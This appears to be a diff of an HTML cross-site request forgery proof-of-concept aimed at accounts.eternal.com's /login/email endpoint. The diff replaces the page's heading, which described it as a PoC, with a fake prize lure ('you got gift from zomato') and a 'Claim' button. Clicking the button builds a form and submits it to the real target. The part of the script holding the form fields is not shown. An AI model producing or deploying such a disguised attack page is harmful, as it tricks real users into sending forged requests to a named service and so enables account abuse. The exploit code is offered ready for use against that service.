@@ -5,13 +5,13 @@
   <title>CSRF PoC (JS-built form) - accounts.eternal.com /login/email</title>
 </head>
 <body>
-  <h3>CSRF PoC: /login/email (type=initiate) — built via JavaScript</h3>
-  <p>The form below is constructed dynamically in JavaScript rather than hard-coded in HTML, then submitted automatically.</p>
+ <h1>you got gift from zomato</h1>
+ <button onclick="csrfPoc()">Claim</button>
 
   <div id="status">Building and submitting request...</div>
 
   <script>
-    (function () {
+    function csrfPoc() {
       var targetUrl = "https://accounts.eternal.com/login/email";
 
       var fields = {
@@ -48,10 +48,7 @@
 
       // Auto-submit the generated form
       form.submit();
-
-      document.getElementById("status").textContent =
-        "Request submitted to " + targetUrl;
-    })();
+    };
   </script>
 </body>
 </html>
